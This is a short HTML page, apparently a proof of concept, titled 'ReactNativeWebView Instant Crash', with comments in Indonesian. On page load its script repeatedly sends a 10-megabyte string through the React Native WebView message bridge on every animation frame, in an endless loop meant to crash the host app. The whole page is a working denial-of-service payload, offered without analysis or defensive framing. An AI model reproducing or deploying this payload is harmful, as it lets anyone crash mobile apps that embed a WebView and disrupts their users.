<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>ReactNativeWebView Instant Crash</title>
<style>
body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
</style>
</head>
<body>
<h2>⚡ Instant Crash Mode</h2>
<pre id="log"></pre>

<script>
const log = msg => document.getElementById("log").textContent += "\n" + msg;

function post(msg) {
    try {
        if (window.ReactNativeWebView) {
            window.ReactNativeWebView.postMessage(msg);
        } else {
            log("ReactNativeWebView not detected.");
        }
    } catch (e) {
        log("Error: " + e.message);
    }
}

function spamCrash() {
    const payload = "A".repeat(10_000_000); // 10 juta karakter (≈10MB)
    log("⚡ Starting spam at ~0ms interval...");

    function loop() {
        post(payload);
        requestAnimationFrame(loop); // 60x per detik tanpa jeda berarti
    }

    loop();
}

// Jalankan langsung saat halaman dibuka
spamCrash();
</script>
</body>
</html>
